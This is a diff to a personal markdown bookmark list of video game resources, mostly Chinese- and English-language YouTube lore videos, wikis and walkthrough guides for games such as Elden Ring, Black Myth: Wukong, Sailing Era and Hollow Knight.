 [GEARS OF WAR - Locust Horde MOVIE (Gears of War Lore) - YouTube](https://www.youtube.com/watch?v=r8iUst7GgrA)
 [The Gears of War Iceberg Explained - YouTube](https://www.youtube.com/watch?v=if_-55WIim8)
+[戰爭機器系列 gears of war - YouTube](https://www.youtube.com/playlist?list=PLe1YdiKWcqPRwnVBR7oaXtmKLB2y4g7F7) 达奇上校 ❗!important
+
+老孫聊遊戲
+[妻子被獸人俘虜，救出已變了模樣！16年前畫面超神的遊戲！ - YouTube](https://www.youtube.com/watch?v=oHF9FjMF9P0)
+[一場戰爭導致數十億人類滅亡！最絕望的絕境中如何逆轉？ - YouTube](https://www.youtube.com/watch?v=Jik3wSgzCUA)
 
 [King Abz - YouTube](https://www.youtube.com/@KingAbzTV)
 [The COG WEAPONS in Gears of War Lore - YouTube](https://www.youtube.com/watch?v=GI0TJiq9BJY)
@@ -877,6 +1178,9 @@ Leya
 [大殺四方，還是仁慈到底？一念之差即可改變結局的遊戲 - YouTube](https://www.youtube.com/watch?v=bRpVUDjNmRg)
 [凡人之軀如何對抗不死大 BOSS？結局多到誇張的遊戲 - YouTube](https://www.youtube.com/watch?v=qCIiGbRE8iY)
 
+[當有超能力的人決定成為刺客！頂級潛行暗殺遊戲《恥辱》1究竟是一款怎樣的遊戲 - YouTube](https://www.youtube.com/watch?v=nXofeGsZzdc)
+[當超能力主角面對無法殺死的反派！頂級潛行暗殺遊戲《恥辱》2究竟是一款怎樣的遊戲 - YouTube](https://www.youtube.com/watch?v=cMuskZsMu54)
+
 [好尸带你快速看完【耻辱 1】经典暗杀题材游戏 - YouTube](https://www.youtube.com/watch?v=FasD8qMIqdk)
 [好尸带你快速看完【耻辱 2】经典暗杀题材游戏 - YouTube](https://www.youtube.com/watch?v=tvgh3rEnDNk)
 
@@ -884,10 +1188,11 @@ Leya
 
 # Splinter Cell
 
-[Tom Clancy's Splinter Cell - Wikiwand](https://www.wikiwand.com/en/Tom_Clancy%27s_Splinter_Cell)
+[Tom Clancy's Splinter Cell - Wikiwand](https://omni.wikiwand.com/en/Tom_Clancy%27s_Splinter_Cell)
 
 # Okami
 
+r
 [Ōkami Wiki | FANDOM powered by Wikia](https://okami.fandom.com/wiki/%C5%8Ckami_Wiki:Main_Page)
 [Floral Finisher | Ōkami Wiki | FANDOM powered by Wikia](https://okami.fandom.com/wiki/Floral_Finisher)
 
@@ -897,7 +1202,7 @@ Leya
 # Hollow Knight
 
 [Hollow Knight – An atmospheric adventure through a surreal, bug-infested world](https://hollowknight.com/)
-[Hollow Knight - Wikiwand](https://www.wikiwand.com/en/Hollow_Knight)
+[Hollow Knight - Wikiwand](https://omni.wikiwand.com/en/Hollow_Knight)
 [Hollow Knight Wiki | FANDOM powered by Wikia](https://hollowknight.fandom.com/wiki/Hollow_Knight_Wiki)
 [Hollow Knight | The Completionist - YouTube](https://www.youtube.com/watch?v=e4QGKT28kj0)
 
@@ -942,6 +1247,36 @@ Leya
 
 [All Shadow Tactics Speedruns - YouTube](https://www.youtube.com/playlist?list=PLLrP1xTYLTnBbgTJXxCQmAlV89T3sW9HK)
 
+# Sailing Era 风帆纪元
+
+[現在竟然還能玩到光榮式的大航海遊戲？【就知道玩遊戲】 - YouTube](https://www.youtube.com/watch?v=EZaKzcJbcmM)
+
+[Sailing Era General Discussions :: Steam Community](https://steamcommunity.com/app/2161440/discussions/)
+[风帆纪元游戏专区*风帆纪元中文版下载及攻略资料 * 游民星空 GamerSky.com](https://www.gamersky.com/z/sailing-era/)
+[風帆紀元 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/B.php?bsn=76690)
+
+[Steam Community :: Guide :: 风帆纪元基础信息收集](https://steamcommunity.com/sharedfiles/filedetails/?id=2927176761) ❗!important
+
+[【心得】終於白金之個人攻略文字表格版 @風帆紀元 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?bsn=76690&snA=153&tnum=6)
+[Sailing Era Walkthrough & Guide - PC - By Hentaicheg - GameFAQs](https://gamefaqs.gamespot.com/pc/382163-sailing-era/faqs/80341)
+
+[《风帆纪元》阿卜杜拉船员收集攻略-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557497.shtml)
+[《风帆纪元》部分角色专属装备获取方法-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557650.shtml)
+[【心得】專屬裝備整理(1/26補齊) @風帆紀元 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?bsn=76690&snA=58)
+[《风帆纪元》建船贴、图纸与板材出处一览 特殊材料获取途径介绍-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557609.shtml)
+[《风帆纪元》野外探险心得与阅读机制讲解-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557642.shtml)
+
+[《风帆纪元》全港口贸易品、特殊建筑与珍贵道具整理 酒吧女喜好一览-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1559176.shtml)
+[《风帆纪元》所有图书馆书籍与线索、需求整理-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1559197.shtml)
+[《风帆纪元》基础玩法上手图文指南 港口设施及航行、陆地探险介绍\_港口设施-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1556564.shtml)
+[Barmaids - Sailing Era Walkthrough & Guide - GameFAQs](https://gamefaqs.gamespot.com/pc/382163-sailing-era/faqs/80341/barmaids)
+
+[风帆纪元蓝图解锁攻略*蓝图*九游手机游戏](https://www.9game.cn/lantu/9212277.html)
+[【情報】全港口造船船材「開發度全滿」 @風帆紀元 哈啦板 - 巴哈姆特](https://forum.gamer.com.tw/C.php?bsn=76690&snA=85&tnum=7)
+[《风帆纪元》建船贴、图纸与板材出处一览 特殊材料获取途径介绍-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557609.shtml)
+[《风帆纪元》大型福船图纸获取攻略 大型福船图纸怎么获得-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557027.shtml)
+[《风帆纪元》稀有传奇战舰制作攻略\_事前准备-游民星空 GamerSky.com](https://www.gamersky.com/handbook/202301/1557106.shtml)
+
 # Stardew Valley
 
 [Stardew Valley](https://www.stardewvalley.net/)
@@ -960,6 +1295,12 @@ Leya
 
 # Elden Ring
 
+[缝合+换皮？《艾尔登法环》凭何伟大？艾尔登法环凭何伟大？ - YouTube](https://www.youtube.com/watch?v=b6E-6iaMyHw)
+[老賊你到底懂不懂做開放世界？有你這麼胡來的麼？！《艾爾登法環》【就知道玩遊戲2022】 - YouTube](https://www.youtube.com/watch?v=eqsLiTHFxQc)
+[【必玩】媲美旷野之息！《艾尔登法环》开放世界游戏的新旗帜！ - YouTube](https://www.youtube.com/watch?v=i2F1e3m_AK0)
+
+## Lore
+
 [好尸带你快速轻松看懂【艾尔登法环】全剧情，老头环到底讲的啥故事 - YouTube](https://www.youtube.com/watch?v=O9cIcdU2m7s)
 [《艾爾登法環》完整劇情，究竟講述了一個什麼故事？ - YouTube](https://www.youtube.com/watch?v=WOKMIHljz30)
 [艾尔登法环剧情解读大合集 环学 狗哥 dogsama - YouTube](https://www.youtube.com/playlist?list=PL5Nnuy0hm7urlZC8j4UgBwTHZS-qUL9iW)
@@ -968,6 +1309,8 @@ Leya
 [《艾爾登法環》劇情解析（上），「遠古之初」直到揭陋「瑪莉卡」的真實身分(cc 字幕記得開)｜ SKY - YouTube](https://www.youtube.com/watch?v=ezhVk62rIK8)
 [《艾爾登法環》劇情解析（下），從「黑刀之夜」的策畫直到推測「梅琳娜」的真實身份｜ SKY - YouTube](https://www.youtube.com/watch?v=p3UIG6jcWBs)
 [Elden Ring Story & Endings Explained - YouTube](https://www.youtube.com/watch?v=kblqhg_qbtQ)
+
+## Tips and Tricks
 
 [艾尔登法环系列 - YouTube](https://www.youtube.com/playlist?list=PLBxed0O8BXCeqCk4vqlxdVzBgRiEZZbvF) 艾尔登法环编年史
 [艾爾登法環攻略專區 - YouTube](https://www.youtube.com/playlist?list=PLSQU_UAK-oW8RCFHZLIBkep_ij7NUvJfH) 遊戲塔樓
@@ -979,11 +1322,19 @@ Leya
 
 [龙崎棒棒糖狼学研习者 - YouTube](https://www.youtube.com/playlist?list=PLBxed0O8BXCdti0uuiQ7tvDtKrQEZZs42) 艾尔登法环编年史
 
-# 黑神话悟空
+# 黑神话悟空 Black Myth: Wukong
+
+[黑神话悟空-各显卡建议特效](https://docs.qq.com/sheet/DSnp6VEJPeFJtWU5S?tab=BB08J2)
 
 [黑神话悟空 - YouTube](https://www.youtube.com/playlist?list=PLBxed0O8BXCe61aIa4meqLIUrfDHaDOmb) 艾尔登法环编年史
-
+[猴学 | 黑神话悟空剧情深度解读 - YouTube](https://www.youtube.com/playlist?list=PL5Nnuy0hm7uotxeMbfyS3N9A7QX1ls_sw) dogsama
 [鬥戰神-黑神話 - YouTube](https://www.youtube.com/playlist?list=PLSQU_UAK-oW8-0NxmVcT0wJN3tA9s6cn_) 遊戲塔樓
+
+[黑神話:悟空 / Black Myth: Wu Kong - YouTube](https://www.youtube.com/playlist?list=PLwFY2FRIQ7pfdsjMH7iLV6Afw8N5LlDN7)
+[为什么说黑神话是4A大作？万字解析黑神话AI动画技术 - YouTube](https://www.youtube.com/watch?v=LPGckspSuhY)
+
+[孙悟空的轮回大计，仅涉及争夺六根的主线剧情解说【黑神话悟空】 - YouTube](https://www.youtube.com/watch?v=Fm17P7GHT_c)
+[所以，黑神話到底有多黑？一念善惡的黑深殘全劇情解析 #blackmyth #wukong #黑神話悟空 #劇透 - YouTube](https://www.youtube.com/watch?v=wSz9Pc5im6k)
 
 # A Plague Tale
 
@@ -1092,3 +1443,5 @@ BalanCity
 <https://menu.gog.com/v1/account/licences>
 
 ## itch.io
+
+[My purchases - itch.io](https://itch.io/my-purchases)
